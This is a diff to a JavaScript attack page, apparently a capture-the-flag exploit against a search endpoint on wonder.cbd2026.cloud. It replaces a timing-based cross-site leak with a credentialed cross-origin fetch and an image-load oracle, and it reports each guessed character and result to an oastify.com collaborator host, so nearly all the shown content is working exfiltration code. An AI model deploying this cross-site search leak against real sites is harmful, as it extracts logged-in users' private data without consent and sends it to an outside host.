@@ -12,7 +12,7 @@
         const log = document.getElementById('log');
         const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*.,:";
         const TARGET_URL = "https://wonder.cbd2026.cloud";
-        const LEAK_URL = "https://njacv1ltv98lg8jybtbpgareu50wovck.oastify.com";
+        const LEAK_URL = "https://ezh3bs1kb0ocwzzprkrgw175awgn4nsc.oastify.com";
         
         let flag = "";
         
@@ -28,32 +28,64 @@
         async function test(query) {
             const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
             
-            // Use timing attack - measure page load time
-            const start = performance.now();
+            // Error-based XS-Leak: Try to fetch the search page and check response
+            // If there's a match, the page will have an iframe which we can detect
+            // by checking if we can access it or if it causes different behavior
             
-            // Load in hidden iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            document.body.appendChild(iframe);
-            
-            // Wait for iframe to load
-            await new Promise(r => setTimeout(r, 2000));
-            
-            const end = performance.now();
-            const duration = end - start;
-            
-            // Clean up
-            document.body.removeChild(iframe);
-            
-            // Log timing for debugging
-            logMsg(`Timing for "${query}": ${duration.toFixed(0)}ms`);
-            fetch(`${LEAK_URL}?f=TIMING:${query}:${duration.toFixed(0)}`)
-                .catch(e => {});
-            
-            // If page has iframe (match), it will take longer to load
-            // Adjust threshold based on actual measurements
-            return duration > 1500;
+            try {
+                const response = await fetch(url, {
+                    mode: 'cors',
+                    credentials: 'include'
+                });
+                
+                const text = await response.text();
+                
+                // Check if the response contains an iframe
+                const hasIframe = text.includes('<iframe');
+                
+                logMsg(`Test "${query}": hasIframe=${hasIframe}`);
+                fetch(`${LEAK_URL}?f=TEST:${query}:${hasIframe}`)
+                    .catch(e => {});
+                
+                return hasIframe;
+            } catch (e) {
+                // CORS blocked - try another approach
+                logMsg(`CORS blocked for "${query}", trying image load technique`);
+                
+                // Image load technique: Try to load the search page as an image
+                // If it has iframe, it might load differently
+                return new Promise((resolve) => {
+                    const img = new Image();
+                    let loaded = false;
+                    
+                    img.onload = () => {
+                        loaded = true;
+                        logMsg(`Image loaded for "${query}"`);
+                        fetch(`${LEAK_URL}?f=IMG:${query}:loaded`)
+                            .catch(e => {});
+                        resolve(true);
+                    };
+                    
+                    img.onerror = () => {
+                        logMsg(`Image error for "${query}"`);
+                        fetch(`${LEAK_URL}?f=IMG:${query}:error`)
+                            .catch(e => {});
+                        resolve(false);
+                    };
+                    
+                    img.src = url + "&t=" + Date.now();
+                    
+                    // Timeout
+                    setTimeout(() => {
+                        if (!loaded) {
+                            logMsg(`Image timeout for "${query}"`);
+                            fetch(`${LEAK_URL}?f=IMG:${query}:timeout`)
+                                .catch(e => {});
+                            resolve(false);
+                        }
+                    }, 3000);
+                });
+            }
         }
 
         async function findPrefix() {
@@ -80,31 +112,6 @@
             
             logMsg("No prefix found, trying empty search...");
             return "";
-        }
-
-        async function timingAttack(query) {
-            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
-            
-            const start = performance.now();
-            const w = window.open(url, "timing_window");
-            
-            if (!w) {
-                return false;
-            }
-            
-            await new Promise(r => setTimeout(r, 3000));
-            
-            const end = performance.now();
-            const duration = end - start;
-            
-            w.close();
-            
-            // If page has iframe, it might take longer to load
-            logMsg(`Timing for "${query}": ${duration}ms`);
-            fetch(`${LEAK_URL}?f=TIMING:${query}:${duration}`)
-                .catch(e => {});
-            
-            return duration > 2000; // Threshold - adjust based on testing
         }
 
         async function leakFlag() {
